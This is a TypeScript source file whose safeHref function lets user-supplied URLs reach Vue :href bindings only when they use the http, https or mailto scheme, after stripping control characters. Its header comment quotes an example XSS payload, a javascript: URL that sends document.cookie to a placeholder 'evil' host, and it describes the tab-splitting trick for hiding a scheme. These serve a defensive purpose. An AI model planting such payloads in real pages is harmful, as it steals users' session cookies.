/**
 * Scheme allowlist for user-controlled URLs that get bound into `:href`.
 *
 * Record-derived IRIs (publisher, license, …) come from RDF metadata, which is
 * user-controlled. Vue does not sanitize `:href`, so a value like
 * `javascript:fetch('//evil/?c='+document.cookie)` would run script on click.
 * `safeHref` returns the URL only when it parses to an allowlisted scheme, and
 * `undefined` otherwise so the binding renders an inert (non-navigating) link.
 */

const ALLOWED_SCHEMES = new Set(["http:", "https:", "mailto:"]);

/**
 * Removes C0 control chars (incl. tab/newline/CR), space, and DEL. Browsers
 * strip these when resolving a URL's scheme, so an attacker could otherwise
 * hide a dangerous scheme as `java\tscript:`. Done by code point so the source
 * carries no literal control characters. Legitimate URLs encode these as %xx.
 */
function stripIgnorable(s: string): string {
  let out = "";
  for (const ch of s) {
    const c = ch.codePointAt(0) ?? 0;
    if (c > 0x20 && c !== 0x7f) out += ch;
  }
  return out;
}

/**
 * Returns a sanitized URL when it is absolute with an allowlisted scheme, else
 * `undefined`. Rejects `javascript:`, `data:`, `vbscript:`, relative/opaque
 * values, and anything `URL` cannot parse. Returns the cleaned value so what
 * renders is exactly what was validated.
 */
export function safeHref(url: string | null | undefined): string | undefined {
  if (!url) return undefined;
  const cleaned = stripIgnorable(url);
  if (!cleaned) return undefined;
  let parsed: URL;
  try {
    parsed = new URL(cleaned);
  } catch {
    return undefined;
  }
  return ALLOWED_SCHEMES.has(parsed.protocol) ? cleaned : undefined;
}
